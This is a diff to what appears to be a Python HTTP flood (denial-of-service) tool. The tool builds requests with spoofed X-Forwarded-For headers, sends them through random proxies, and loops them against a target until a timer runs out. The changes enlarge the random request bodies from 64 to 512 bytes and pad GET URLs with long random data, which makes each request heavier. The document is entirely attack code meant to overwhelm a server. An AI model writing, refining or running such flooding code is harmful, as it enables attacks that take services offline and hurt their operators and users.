@@ -179,7 +179,7 @@ def Headers(method):
         connection = "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        data = str(random._urandom(64))
+        data = str(random._urandom(512))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     elif method == "hit":
@@ -191,7 +191,7 @@ def Headers(method):
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         accept = Choice(acceptall) + "\r\n"
-        data = str(random._urandom(64))
+        data = str(random._urandom(512))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 #    elif method == "ran":
@@ -270,7 +270,7 @@ def dyn(event, socks_type):
 def http(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data() + str(random._urandom(1980))+ " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
